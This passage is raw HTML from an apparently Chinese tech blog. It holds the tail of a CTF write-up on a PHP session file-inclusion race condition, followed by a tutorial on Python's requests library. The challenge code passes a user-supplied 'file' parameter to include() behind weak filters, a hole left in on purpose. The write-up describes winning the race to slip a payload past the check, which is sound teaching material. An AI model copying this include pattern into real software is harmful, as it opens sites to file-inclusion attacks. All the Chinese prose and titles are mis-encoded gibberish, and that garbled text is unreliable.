class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥é¢˜ä¼šæ£€æŸ¥ Session æ–‡ä»¶ä¸­ <code>&lt;</code> ç¬¦å·æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨çš„è¯å®ƒåœ¨ä¸åœ¨ç¬¬ä¸€ä¸ªä½ç½®ã€‚</p>
<p>å¦‚æœä¸å­˜åœ¨ï¼Œ<code>false</code> ä¼šè¢«è½¬æ¢ä¸ºæ•´æ•° <code>0</code> ï¼Œæœ€ç»ˆ <code>strpos($content, &quot;&lt;&quot;) &gt; 0</code> è¿™ä¸ªæ¡ä»¶åˆ¤æ–­ç»“æœä¼šæ˜¯ <code>false</code> ï¼Œæ‰§è¡Œ <code>include($file)</code> ï¼›</p>
<p>å¦‚æœå­˜åœ¨ä½†ä¸åœ¨ç¬¬ä¸€ä¸ªä½ç½®ï¼Œä¼šç«‹å³ç»“æŸå½“å‰è„šæœ¬ï¼Œåä¹‹åˆ™ä¼šç»§ç»­æ‰§è¡Œ <code>include($file)</code> ã€‚</p>
<p>ä½†å½“å¤§é‡çº¿ç¨‹ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œä¸æ–­é‡å†™å”¯ä¸€çš„ Session çš„å†…å®¹ï¼Œå¯¼è‡´å¯èƒ½æœ‰ä¸€æ®µæ—¶é—´æ²¡æœ‰ <code>&lt;</code> ç¬¦å·ï¼Œç»•è¿‡æ£€æŸ¥ï¼›ä½†åœ¨æ–‡ä»¶åŒ…å«æ—¶åˆå†™å…¥äº† Payload ï¼Œå¯¼è‡´è¯»å–åˆ°çš„æ–‡ä»¶åŒ…å«æ¶æ„ä»£ç ã€‚</p>
<h2 id="é¢˜ç›®å››"><a href="#é¢˜ç›®å››" class="headerlink" title="é¢˜ç›®å››"></a>é¢˜ç›®å››</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;è¿˜è¦ç§€ï¼Ÿ&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(è¿˜è¦ç§€ï¼Ÿ);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**<code>set_include_path</code> **ï¼šç”¨äºè®¾ç½® PHP è„šæœ¬åœ¨ä½¿ç”¨ <code>include</code>ã€<code>require</code> ç­‰è¯­å¥åŒ…å«æ–‡ä»¶æ—¶çš„ä¼˜å…ˆæœç´¢è·¯å¾„ã€‚</p>
<p>å› ä¸ºæ˜¯ä¼˜å…ˆï¼Œæ‰¾ä¸åˆ°è¿˜æ˜¯è¦å»å…¶ä»–è·¯å¾„æ‰¾ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/" data-id="cm9wms3lr0031kcuhgaqbcq7b" data-title="æ¡ä»¶ç«äº‰å˜ä½“é¢˜ç›®" class="article-share-link"><span class="fa fa-share">åˆ†äº«</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">æ–‡ä»¶åŒ…å«</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Python-requests" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/24/Python-requests/" class="article-date">
  <time class="dt-published" datetime="2025-04-24T07:04:47.000Z" itemprop="datePublished">2025-04-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0/">ç¼–ç¨‹ç¬”è®°</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/24/Python-requests/">Python-requests</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="requests-åº“ç®€ä»‹"><a href="#requests-åº“ç®€ä»‹" class="headerlink" title="requests åº“ç®€ä»‹"></a>requests åº“ç®€ä»‹</h2><p><code>requests</code> åº“æ˜¯ Python ä¸­ç”¨äºå‘é€ HTTP è¯·æ±‚çš„å¸¸ç”¨åº“ï¼Œä»¥ä¸‹é€šè¿‡å®ä¾‹ç®€å•ä»‹ç»ä¸€ä¸‹ç”¨æ³•ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡ URL</span></span><br><span class="line">url = <span class="string">&#x27;https://www.example.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€ GET è¯·æ±‚</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥å“åº”çŠ¶æ€ç </span></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="comment"># æ‰“å°å“åº”å†…å®¹</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;å“åº”å†…å®¹ï¼š&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;è¯·æ±‚å¤±è´¥ï¼ŒçŠ¶æ€ç ï¼š<span class="subst">&#123;response.status_code&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>requests</code> åº“ä¸­åŸºäº HTTP è¯·æ±‚æ–¹æ³•å†…ç½®äº†å¤§é‡æ–¹æ³•ï¼Œå¦‚ï¼š</p>
<ul>
<li><code>requests.get(url, params=None, **kwargs)</code>ï¼šå‘é€ HTTP GET è¯·æ±‚ä»¥ä»æœåŠ¡å™¨è·å–èµ„æºã€‚</li>
<li><code>requests.post(url, data=None, json=None, **kwargs)</code>ï¼šå‘é€ HTTP POST è¯·æ±‚ï¼Œé€šå¸¸ç”¨äºå‘æœåŠ¡å™¨æäº¤æ•°æ®ã€‚</li>
<li><code>requests.put(url, data=None, **kwargs)</code>ï¼šå‘é€ HTTP PUT è¯·æ±‚ï¼Œå¸¸ç”¨äºæ›´æ–°æœåŠ¡å™¨ä¸Šçš„èµ„æºã€‚</li>
<li><code>requests.delete(url, **kwargs)</code>ï¼šå‘é€ HTTP DELETE è¯·æ±‚ï¼Œç”¨äºè¯·æ±‚æœåŠ¡å™¨åˆ é™¤æŒ‡å®šçš„èµ„æºã€‚</li>
<li><code>requests.head(url, **kwargs)</code>ï¼šå‘é€ HTTP HEAD è¯·æ±‚ï¼Œåªè¿”å›å“åº”å¤´ï¼Œä¸è¿”å›å“åº”ä½“ã€‚</li>
<li><code>requests.options(url, **kwargs)</code>ï¼šå‘é€ HTTP OPTIONS è¯·æ±‚ï¼Œç”¨äºè·å–æœåŠ¡å™¨æ”¯æŒçš„è¯·æ±‚æ–¹æ³•ç­‰ä¿¡æ¯ã€‚</li>
<li><code>requests.request(method, url, **kwargs)</code>ï¼šé€šç”¨çš„è¯·æ±‚æ–¹æ³•ï¼Œå¯æ ¹æ® <code>method</code> å‚æ•°æŒ‡å®šçš„ HTTP è¯·æ±‚æ–¹æ³•å‘é€è¯·æ±‚ã€‚</li>
</ul>
<p>æ›´å¤šæ–¹æ³•ä¸å†èµ˜è¿°ï¼Œä¸‹é¢å¯¹å„æ–¹æ³•çš„å‚æ•°è¿›è¡Œè¯´æ˜ï¼š</p>
<h2 id="requests-åº“å„æ–¹æ³•çš„å‚æ•°ä¸ç”¨æ³•"><a href="#requests-åº“å„æ–¹æ³•çš„å‚æ•°ä¸ç”¨æ³•" class="headerlink" title="requests åº“å„æ–¹æ³•çš„å‚æ•°ä¸ç”¨æ³•"></a>requests åº“å„æ–¹æ³•çš„å‚æ•°ä¸ç”¨æ³•</h2><h3 id="é€šç”¨å‚æ•°ï¼ˆé€‚ç”¨äºæ‰€æœ‰HTTPæ–¹æ³•ï¼‰"><a href="#é€šç”¨å‚æ•°ï¼ˆé€‚ç”¨äºæ‰€æœ‰HTTPæ–¹æ³•ï¼‰" class="headerlink" title="é€šç”¨å‚æ•°ï¼ˆé€‚ç”¨äºæ‰€æœ‰HTTPæ–¹æ³•ï¼‰"></a>é€šç”¨å‚æ•°ï¼ˆé€‚ç”¨äºæ‰€æœ‰HTTPæ–¹æ³•ï¼‰</h3><p>æ‰€æœ‰è¯·æ±‚æ–¹æ³•ï¼ˆå¦‚ <code>get()</code>, <code>post()</code>, <code>put()</code> ç­‰ï¼‰éƒ½æ”¯æŒä»¥ä¸‹å‚æ•°ï¼š</p>
<ol>
<li><code>url</code> (<strong>å¿…å¡«</strong>)</li>
</ol>
<ul>
<li><p><strong>ç±»å‹</strong>: å­—ç¬¦ä¸²</p>
</li>
<li><p><strong>ä½œç”¨</strong>: è¯·æ±‚çš„ç›®æ ‡URLã€‚</p>
</li>
<li><p><strong>ç¤ºä¾‹</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url=&quot;https://api.example.com/data&quot;)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li><code>params</code> (<strong>å¯é€‰</strong>)</li>
</ol>
<ul>
<li><p><strong>ç±»å‹</strong>: å­—å…¸ã€å…ƒç»„åˆ—è¡¨æˆ–å­—èŠ‚</p>
</li>
<li><p><strong>ä½œç”¨</strong>: å°†å‚æ•°æ‹¼æ¥åˆ°<strong>URL</strong>ä¸­ï¼Œå½¢æˆæŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery stringï¼‰ã€‚</p>
</li>
<li><p><strong>ç¤ºä¾‹</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">params = &#123;<span class="string">&#x27;key1&#x27;</span>: <span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>: <span class="string">&#x27;value2&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url, params=params)</span><br><span class="line"><span class="comment"># å®é™…è¯·æ±‚URLå˜ä¸ºï¼šhttps://api.example.com/data?key1=value1&amp;key2=value2</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li><code>headers</code> (<strong>å¯é€‰</strong>)</li>
</ol>
<ul>
<li><p><strong>ç±»å‹</strong>: å­—å…¸</p>
</li>
<li><p><strong>ä½œç”¨</strong>: è®¾ç½®HTTPè¯·æ±‚å¤´ä¿¡æ¯ï¼ˆå¦‚User-Agentã€Content-Typeç­‰ï¼‰ã€‚</p>
</li>
<li><p><strong>ç¤ºä¾‹</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;my-app/1.0&#x27;</span>, <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url, headers=headers)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="4">
<li><code>timeout</code> (<strong>å¯é€‰</strong>)</li>
</ol>
<ul>
<li><p><strong>ç±»å‹</strong>: æµ®ç‚¹æ•°æˆ–å…ƒç»„</p>
</li>
<li><p><strong>ä½œç”¨</strong>: è®¾ç½®è¯·æ±‚è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰ã€‚è‹¥æœåŠ¡å™¨åœ¨æŒ‡å®šæ—¶é—´å†…æœªå“åº”ï¼ŒæŠ›å‡º <code>Timeout</code> å¼‚å¸¸ã€‚</p>
</li>
<li><p><strong>ç¤ºä¾‹</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url, timeout=<span class="number">5</span>)          <span class="comment"># è¿æ¥+è¯»å–æ€»è¶…æ—¶5ç§’</span></span><br><span class="line">response = requests.get(url, timeout=(<span class="number">3</span>, <span class="number">10</span>))    <span class="comment"># è¿æ¥3ç§’ï¼Œè¯»å–10ç§’</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="5">
<li><code>auth</code> (<strong>å¯é€‰</strong>)</li>
</ol>
<ul>
<li><p><strong>ç±»å‹</strong>: å…ƒç»„æˆ–è‡ªå®šä¹‰è®¤è¯ç±»</p>
</li>
<li><p><strong>ä½œç”¨</strong>: ç”¨äºHTTPåŸºæœ¬è®¤è¯ï¼ˆå¦‚ç”¨æˆ·åå¯†ç ï¼‰ã€‚</p>
</li>
<li><p><strong>ç¤ºä¾‹</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auth = (<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">response = requests.get(url, auth=auth)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="6">
<li><code>cookies</code> (<strong>å¯é€‰</strong>)</li>
</ol>
<ul>
<li><p><strong>ç±»å‹</strong>: å­—å…¸æˆ–CookieJarå¯¹è±¡</p>
</li>
<li><p><strong>ä½œç”¨</strong>: å‘é€Cookieåˆ°æœåŠ¡å™¨ã€‚</p>
</li>
<li><p><strong>ç¤ºä¾‹</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cookies = &#123;<span class="string">&#x27;session_id&#x27;</span>: <span class="string">&#x27;12345abc&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url, cookies=cookies)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="7">
<li><code>allow_redirects</code> (<strong>å¯é€‰</strong>)</li>
</ol>
<ul>
<li><p><strong>ç±»å‹</strong>: å¸ƒå°”å€¼</p>
</li>
<li><p><strong>ä½œç”¨</strong>: æ˜¯å¦å…è®¸é‡å®šå‘ï¼ˆé»˜è®¤<code>True</code>ï¼‰ã€‚</p>
</li>
<li><p><strong>ç¤ºä¾‹</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url, allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="8">
<li><code>verify</code> (<strong>å¯é€‰</strong>)</li>
</ol>
<ul>
<li><p><strong>ç±»å‹</strong>: å¸ƒå°”å€¼æˆ–å­—ç¬¦ä¸²ï¼ˆè¯ä¹¦è·¯å¾„ï¼‰</p>
</li>
<li><p><strong>ä½œç”¨</strong>: æ˜¯å¦éªŒè¯SSLè¯ä¹¦ï¼ˆé»˜è®¤<code>True</code>ï¼‰ã€‚è®¾ä¸º<code>False</code>å¯è·³è¿‡éªŒè¯ï¼ˆä¸æ¨èç”Ÿäº§ç¯å¢ƒä½¿ç”¨ï¼‰ã€‚</p>
</li>
<li><p><strong>ç¤ºä¾‹</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url, verify=<span class="literal">False</span>)  <span class="comment"># å…³é—­SSLéªŒè¯</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="9">
<li><code>proxies</code> (<strong>å¯é€‰</strong>)</li>
</ol>
<ul>
<li><p><strong>ç±»å‹</strong>: å­—å…¸</p>
</li>
<li><p><strong>ä½œç”¨</strong>: è®¾ç½®ä»£ç†æœåŠ¡å™¨ã€‚</p>
</li>
<li><p><strong>ç¤ºä¾‹</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://10.10.1.10:3128&#x27;</span>, <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://10.10.1.10:1080&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url, proxies=proxies)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="10">
<li><code>stream</code> (<strong>å¯é€‰</strong>)</li>
</ol>
<ul>
<li><p><strong>ç±»å‹</strong>: å¸ƒå°”å€¼</p>
</li>
<li><p><strong>ä½œç”¨</strong>: æ˜¯å¦ä»¥æµæ¨¡å¼ä¸‹è½½ï¼ˆé€‚åˆå¤§æ–‡ä»¶ï¼Œé¿å…ç«‹å³åŠ è½½åˆ°å†…å­˜ï¼‰ã€‚</p>
</li>
<li><p><strong>ç¤ºä¾‹</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url, stream=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;large_file.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> response.iter_content(<span class="number">1024</span>):</span><br><span class="line">            f.write(chunk)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="é’ˆå¯¹ä¸åŒHTTPæ–¹æ³•çš„å‚æ•°"><a href="#é’ˆå¯¹ä¸åŒHTTPæ–¹æ³•çš„å‚æ•°" class="headerlink" title="é’ˆå¯¹ä¸åŒHTTPæ–¹æ³•çš„å‚æ•°"></a>é’ˆå¯¹ä¸åŒHTTPæ–¹æ³•çš„å‚æ•°</h3><ol>
<li><strong>GETè¯·æ±‚ï¼š<code>requests.get()</code></strong></li>
</ol>
<ul>
<li><p>ä¸»è¦ç”¨äºè·å–æ•°æ®ï¼Œå‚æ•°é€šè¿‡ <strong><code>params</code></strong> ä¼ é€’ã€‚</p>
</li>
<li><p>ç¤ºä¾‹:</p>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(</span><br><span class="line">    url=<span class="string">&quot;https://example.com/search&quot;</span>,</span><br><span class="line">    params=&#123;<span class="string">&#x27;query&#x27;</span>: <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;page&#x27;</span>: <span class="number">2</span>&#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li><strong>POSTè¯·æ±‚ï¼š<code>requests.post()</code></strong></li>
</ol>
<ul>
<li><p>ç”¨äºæäº¤æ•°æ®ï¼Œå¸¸ç”¨å‚æ•°ï¼š**<code>data</code>**, <strong><code>json</code></strong>, **<code>files</code>**ã€‚</p>
</li>
<li><p><code>data</code> å‚æ•°:</p>
<ul>
<li>ç±»å‹: å­—å…¸ã€å…ƒç»„åˆ—è¡¨ã€å­—ç¬¦ä¸²ã€å­—èŠ‚æµ</li>
<li>ä½œç”¨: å‘é€è¡¨å•æ•°æ®ï¼ˆ<code>application/x-www-form-urlencoded</code> ï¼Œé»˜è®¤çš„è¡¨å•ç¼–ç æ ¼å¼ï¼Œé€‚ç”¨äºæäº¤ç®€å•çš„æ–‡æœ¬æ•°æ®ï¼‰ã€‚</li>
<li>ç¤ºä¾‹:</li>
</ul>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;secret&#x27;</span>&#125; <span class="comment"># å­—å…¸ç±»å‹</span></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">data = [(<span class="string">&#x27;fruit&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>), (<span class="string">&#x27;fruit&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>), (<span class="string">&#x27;vegetable&#x27;</span>, <span class="string">&#x27;carrot&#x27;</span>)] <span class="comment"># å…ƒç»„åˆ—è¡¨ç±»å‹ï¼Œé€‚ç”¨äºéœ€è¦å¤„ç†å¤šä¸ªåŒåå­—æ®µæˆ–å¯¹æ•°æ®é¡ºåºæœ‰è¦æ±‚çš„æƒ…å†µã€‚ä¼ å‚åˆ°æœåŠ¡ç«¯ä¼šæŠŠåŒåå‚æ•°çš„å€¼ä»¥ç±»ä¼¼ &quot;fruit&quot;:[&quot;apple&quot;,&quot;banana&quot;] è¿™æ ·çš„å½¢å¼å­˜æ”¾ã€‚</span></span><br><span class="line">data = <span class="string">&#x27;name=Bob&amp;age=30&#x27;</span> <span class="comment"># ç”¨äºä¼ è¾“ URL ç¼–ç åçš„å­—ç¬¦ä¸²</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>json</code> å‚æ•°:</p>
<ul>
<li>ç±»å‹: å­—å…¸</li>
<li>ä½œç”¨: å‘é€JSONæ•°æ®ï¼ˆè‡ªåŠ¨è®¾ç½®<code>Content-Type: application/json</code>ï¼‰ã€‚</li>
<li>ç¤ºä¾‹:</li>
</ul>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">json_data = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">30</span>&#125;</span><br><span class="line">response = requests.post(url, json=json_data)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>files</code> å‚æ•°:</p>
<ul>
<li>ç±»å‹: å­—å…¸</li>
<li>ä½œç”¨: ä¸Šä¼ æ–‡ä»¶ï¼ˆ<code>multipart/form-data</code> ï¼Œç”¨äºä¸Šä¼ æ–‡ä»¶æˆ–åŒ…å«äºŒè¿›åˆ¶æ•°æ®çš„è¡¨å•ï¼‰ã€‚</li>
<li>ç¤ºä¾‹:</li>
</ul>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;report.pdf&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">response = requests.post(url, files=files)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li><strong>PUTè¯·æ±‚ï¼š<code>requests.put()</code></strong></li>
</ol>
<ul>
<li><p>ç”¨äºæ›´æ–°èµ„æºï¼Œå‚æ•°ä¸ <code>post()</code> ç›¸åŒï¼ˆ<code>data</code>, <code>json</code>, <code>files</code>ï¼‰ã€‚</p>
</li>
<li><p>ç¤ºä¾‹:</p>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.put(url, json=&#123;<span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;New Title&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="4">
<li><strong>DELETEè¯·æ±‚ï¼š<code>requests.delete()</code></strong></li>
</ol>
<ul>
<li><p>ç”¨äºåˆ é™¤èµ„æºï¼Œé€šå¸¸ä¸éœ€è¦è¯·æ±‚ä½“ã€‚</p>
</li>
<li><p>ç¤ºä¾‹:</p>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.delete(url)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="5">
<li><strong>å…¶ä»–æ–¹æ³•ï¼š<code>head()</code>, <code>options()</code>, <code>patch()</code></strong></li>
</ol>
<ul>
<li>å‚æ•°ä¸ <code>get()</code> æˆ– <code>post()</code> ç±»ä¼¼ï¼Œä½†ä½¿ç”¨é¢‘ç‡è¾ƒä½ã€‚</li>
</ul>
<h3 id="é«˜çº§å‚æ•°ï¼šrequests-request"><a href="#é«˜çº§å‚æ•°ï¼šrequests-request" class="headerlink" title="é«˜çº§å‚æ•°ï¼šrequests.request()"></a>é«˜çº§å‚æ•°ï¼š<code>requests.request()</code></h3><ul>
<li><p>ä½œç”¨: é€šç”¨è¯·æ±‚æ–¹æ³•ï¼Œå¯é€šè¿‡ <code>method</code> å‚æ•°æŒ‡å®šHTTPæ–¹æ³•ï¼ˆå¦‚<code>GET</code>ã€<code>POST</code>ï¼‰ã€‚</p>
</li>
<li><p>ç¤ºä¾‹:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.request(method=<span class="string">&#x27;POST&#x27;</span>, url=url, json=data)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="å…³äº-requests-åº“è¿”å›çš„å¯¹è±¡"><a href="#å…³äº-requests-åº“è¿”å›çš„å¯¹è±¡" class="headerlink" title="å…³äº requests åº“è¿”å›çš„å¯¹è±¡"></a>å…³äº requests åº“è¿”å›çš„å¯¹è±¡</h2><p>åœ¨ Python çš„ <code>requests</code> åº“ä¸­ï¼Œå¦‚ <code>response = requests.get(url=url)</code> è¿”å›çš„æ˜¯ä¸€ä¸ª <strong>å¯¹è±¡</strong>ï¼ˆå±äº <code>requests.models.Response</code> ç±»ï¼‰ã€‚è¿™ä¸ªå¯¹è±¡åŒ…å«äº† HTTP è¯·æ±‚çš„æ‰€æœ‰å“åº”ä¿¡æ¯ï¼Œä½†ç›´æ¥æ‰“å° <code>response</code> å¹¶ä¸ä¼šæ˜¾ç¤ºæ‰€æœ‰å†…å®¹ï¼Œè€Œæ˜¯ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡çš„å†…å­˜åœ°å€è¡¨ç¤ºï¼ˆä¾‹å¦‚ï¼š<code>&lt;Response [200]&gt;</code>ï¼‰ã€‚</p>
<p>ä»¥ä¸‹æ˜¯å¯¹ <code>response</code> å¯¹è±¡å¸¸ç”¨å±æ€§ä¸æ–¹æ³•çš„ä»‹ç»ï¼š</p>
<h3 id="å¸¸ç”¨å±æ€§"><a href="#å¸¸ç”¨å±æ€§" class="headerlink" title="å¸¸ç”¨å±æ€§"></a><strong>å¸¸ç”¨å±æ€§</strong></h3><ol>
<li><strong><code>status_code</code></strong><ul>
<li>HTTP å“åº”çš„çŠ¶æ€ç ï¼ˆå¦‚ <code>200</code> è¡¨ç¤ºæˆåŠŸï¼Œ<code>404</code> è¡¨ç¤ºæœªæ‰¾åˆ°ï¼‰ã€‚</li>
